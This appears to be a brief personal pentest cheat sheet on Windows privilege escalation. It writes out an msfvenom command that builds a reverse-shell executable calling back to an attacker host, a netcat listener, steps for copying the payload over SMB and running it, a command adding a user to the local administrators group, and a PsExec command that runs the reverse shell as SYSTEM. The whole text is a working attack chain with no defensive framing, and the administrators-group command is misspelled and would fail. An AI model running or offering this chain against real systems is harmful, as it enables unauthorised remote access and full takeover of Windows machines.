- - -

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=9090 -f exe -o reverse.exe
```

```sh
nc -nvlp 9090
```

```cmd
cd to/writable/directory
```

```cmd
copy \\our-ip\reverse.exe .
```

open admin's cmd If you can directly do it.

```cmd
.\reverse.exe
```

Alternatively,  **If RDP is enable** or you have permissions to enable it.

we can **ADD our new USER** to the administrators gourp and then spawn an administrator commnd prompt via GUI.

```cmd
net localgroup admintrators piyush /add
```

To escalate from an admin user to full SYSTEM privileges, you can use the “PsExec” tool from windows sysinternals.

```cmd
.\PsExec64.exe -accepteula -i -s C:\path\to\reverse.exe
```

- - -

